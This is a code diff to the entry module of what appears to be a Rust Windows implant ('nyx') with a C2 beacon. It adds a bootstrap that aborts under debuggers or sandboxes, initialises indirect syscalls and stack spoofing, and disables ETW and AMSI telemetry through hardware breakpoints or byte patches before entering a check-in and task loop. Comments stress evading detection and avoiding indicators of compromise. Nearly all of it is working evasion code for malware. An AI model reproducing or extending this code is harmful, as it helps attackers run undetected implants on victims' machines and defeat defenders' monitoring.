@@ -17,6 +17,73 @@
 
 use crate::resolve::LiveNtdll;
 
+// ---- Shared bootstrap (DRY) -----------------------------------------------
+
+/// Core bootstrap: resolve ntdll → init syscalls → gap scan → blind.
+/// Returns `Some(ntdll)` on success. Called by both `nyx_entry` and
+/// `nyx_beacon_oneshot` to avoid duplicating the init sequence.
+///
+/// # Safety
+/// Must be called once from the single beacon thread at process start.
+unsafe fn bootstrap() -> Option<LiveNtdll> {
+    let ntdll = LiveNtdll::locate()?;
+
+    // Anti-debug / anti-sandbox: if the environment looks hostile (debugger
+    // attached, sandbox uptime too short), abort early — don't execute tasks
+    // under observation. Advisory only; configurable via the implant's sleep
+    // seconds (min_uptime is derived from the config blob).
+    //   min_uptime = 0 → never abort on uptime alone (configurable per build).
+    if crate::antidebug::looks_sandboxed(0) {
+        // Under a debugger or inside a sandbox → bail out.
+        // A production implant would set a flag; here we use the same early
+        // return pattern as a failed locate (the caller spins, or exits).
+        return None;
+    }
+
+    let _ssn_table = ntdll.resolve_table_owned();
+
+    // Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
+    // (now over a FRESH KnownDlls\ntdll map when available — defeats inline
+    // hooks; falls back to the hooked ntdll otherwise).
+    crate::syscalls::init_global();
+
+    // .pdata gap scan + stack-spoof init.
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
+        unsafe { crate::stack::set_gap_pool(leaked) };
+        let _ = crate::stack::stage_for(leaked);
+    }
+
+    // ---- BLIND: HWBP primary → byte-patch fallback --------------------------
+    // HWBP (patchless): sets a hardware execute breakpoint on NtTraceEvent /
+    // AmsiScanBuffer that redirects to a shadow stub returning 0. No .text
+    // modification → invisible to PE-sieve hash checks. Preferred path.
+    //
+    // Byte-patch fallback: if VEH registration or shadow buffer init fails
+    // (e.g. early Windows builds, restricted IL, kernel AV blocks VirtualAlloc
+    // for RWX), fall back to the proven byte-patch track.
+    let mut hwbp_ok = false;
+    if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
+        let etw_slot = unsafe { crate::blind_hwbp::blind_etw_hwbp() };
+        // AMSI is best-effort (amsi.dll may not be loaded).
+        let _amsi_slot = unsafe { crate::blind_hwbp::blind_amsi_hwbp() };
+        // Consider HWBP init successful if ETW suppression worked (the
+        // primary blind target; AMSI is optional).
+        hwbp_ok = etw_slot.is_ok();
+    }
+    if !hwbp_ok {
+        // HWBP failed — fall back to byte-patch blind (proven, idempotent).
+        let _ = crate::blind::patch_etw();
+        let _ = crate::blind::patch_nt_trace_event();
+        let _ = crate::blind::patch_amsi();
+    }
+
+    Some(ntdll)
+}
+
+// ---- Public entry points ---------------------------------------------------
+
 /// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
 /// indirect-syscall runtime, then enters the beacon loop.
 ///
@@ -24,28 +91,18 @@ use crate::resolve::LiveNtdll;
 /// extraction marks as the entry point.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_entry() {
-    // 1. PEB-walk ntdll + resolve the SSN table (validates resolve.rs).
-    let Some(ntdll) = LiveNtdll::locate() else {
-        core::hint::spin_loop();
-        return;
+    let Some(_ntdll) = bootstrap() else {
+        // Bootstrap failed (ntll not found or sandbox detected). Exit cleanly
+        // rather than spin-looping — a hanging process is a worse IOC than a
+        // crashed one.
+        if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+            let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
+            f(0xFFFF_FFFE);
+        }
+        loop {
+            core::hint::spin_loop();
+        }
     };
-    let _ssn_table = ntdll.resolve_table_owned();
-
-    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
-    //    (now over a FRESH KnownDlls\ntdll map when available — defeats inline
-    //    hooks; falls back to the hooked ntdll otherwise). Installed into the
-    //    process-wide global so the file/shell/sleep callers borrow one runtime
-    //    instead of each rebuilding it. This lights up G7: every NT call the
-    //    beacon makes now executes from inside ntdll.
-    crate::syscalls::init_global();
-
-    // 3. Blind ETW (always present in ntdll) + best-effort AMSI (amsi.dll is
-    //    usually not loaded yet; the beacon loop retries it each cycle). Done
-    //    before any scanning-relevant action so telemetry is neutralized early.
-    let _ = crate::blind::patch_etw();
-    let _ = crate::blind::patch_amsi();
-
-    // 4. Enter the beacon loop (WinHTTP check-in + task loop).
     crate::beacon::beacon_loop();
 }
 
@@ -56,14 +113,10 @@ pub unsafe extern "system" fn nyx_entry() {
 /// running. See `beacon::beacon_oneshot` for exit-code meanings.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_beacon_oneshot() {
-    let Some(ntdll) = LiveNtdll::locate() else {
-        unsafe { core::hint::spin_loop() };
+    let Some(_ntdll) = bootstrap() else {
+        core::hint::spin_loop();
         return;
     };
-    let _ssn_table = ntdll.resolve_table_owned();
-    crate::syscalls::init_global();
-    let _ = crate::blind::patch_etw();
-    let _ = crate::blind::patch_amsi();
     let code = crate::beacon::beacon_oneshot();
     // Exit with the status code so the harness can read %ERRORLEVEL%.
     if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
@@ -206,9 +259,11 @@ pub unsafe extern "system" fn nyx_selftest_evasion() {
     }
 
     // === Phase 5: AMSI/ETW blind byte-verify ===
-    // Patch ETW (always present) + AMSI (best-effort), then re-read the first
-    // bytes and compare to the patch to PROVE the write landed.
+    // Patch ETW (always present) + NtTraceEvent (P2.1b, family-wide) + AMSI
+    // (best-effort), then re-read the first bytes and compare to the patch to
+    // PROVE the write landed.
     let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
     let amsi_attempted = crate::blind::patch_amsi().is_ok();
 
     let mut mask: u32 = 0;
